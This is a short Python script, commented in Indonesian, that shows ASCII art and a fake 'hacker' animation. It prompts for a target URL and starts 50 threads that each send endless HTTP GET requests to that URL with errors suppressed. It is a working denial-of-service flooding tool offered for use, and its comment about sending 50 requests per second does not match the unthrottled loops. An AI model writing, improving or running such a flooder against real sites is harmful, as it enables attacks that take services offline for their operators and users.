import os
import threading
import requests
import time
import random

NAGA_ART = r"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⣤⣶⣶⣶⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⢿⣷⣦⣀⠀⠀⠀
⠀⠀⠀⣠⣾⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣷⡄⠀
⠀⠀⣼⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣷⠀⠀
⠀⣼⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀
⣸⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀
⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⠀⠀
⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀
⢿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡿⠀⠀
⠘⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠃⠀⠀
⠀⠙⠻⣿⣿⣿⣷⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣾⣿⠋⠀⠀⠀
⠀⠀⠀⠀⠉⠛⠿⣿⣿⣿⣷⣶⣦⣤⣤⣤⣤⣤⣤⣶⣶⣾⣿⣿⣿⣿⠿⠋⠀⠀⠀
"""

FAKE_CHARS = list("01abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

# Animasi terminal hacker full layar
def hacker_screen():
    try:
        columns, _ = os.get_terminal_size()
    except:
        columns = 80
    while True:
        line = "".join(random.choice(FAKE_CHARS) for _ in range(columns))
        print(f"\033[1;32m{line}\033[0m")
        time.sleep(0.02)

# Kirim request terus menerus
def send_request(url):
    while True:
        try:
            requests.get(url, timeout=2)
        except:
            pass  # jangan tampilkan error

# Main function
def main():
    os.system('clear')
    print(f"\033[1;31m{NAGA_ART}\033[0m")
    print("\n\033[1;92mROOX HACKER NASA MODE ACTIVE...\033[0m")
    url = input("\n\033[1;96mMasukkan URL Target (contoh: https://example.com): \033[0m")

    # Jalankan animasi teks hacker
    threading.Thread(target=hacker_screen, daemon=True).start()

    # Kirim 50 request per detik
    for _ in range(50):
        threading.Thread(target=send_request, args=(url,), daemon=True).start()

    while True:
        time.sleep(10)

if __name__ == "__main__":
    main()
